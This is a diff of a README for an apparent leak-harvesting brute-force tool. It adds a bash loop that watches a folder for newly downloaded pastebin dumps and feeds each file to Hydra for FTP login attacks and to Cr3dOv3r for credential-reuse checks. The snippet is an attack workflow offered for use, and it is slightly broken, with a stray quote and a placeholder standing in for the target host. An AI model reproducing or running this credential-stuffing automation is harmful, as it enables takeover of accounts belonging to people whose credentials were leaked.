@@ -43,13 +43,14 @@ Emagnet brute forcer is just the beginning of what's coming and is still under d
 
 ### Just use some regex to grep what you looking for. This is a very good start thanks to inotifywait wich is an extremely powerful tool for this purpose. 
 
+       #!/bin/bash
+       
        inotifywait -q -m -r -e create --format '%w%f' "/path/to/monitor" | while read FILES; do
        # Run-your-favorit-tool-here--read-files-by-$(cat $FILES)
-       # Example usage for Hydra: 
+       # Just an example usage for Hydra that can be used when you download uploads from pastebin: 
        hydra -C $FILES ftp://$(grep-a-ip-or-hostname-for-example)”    
-       # Use my example in video:
-       # For hit enter when asking for password read: "manual yes" 
-       cd /path/to/Cr3dOv3r;python -q emailaddress.com" 
+       # For use my example in the video: (for hit enter when cr3d0v3r asking for password read: "manual yes") 
+       cd /path/to/Cr3dOv3r;python -q emailaddress.com 
        done
 
 
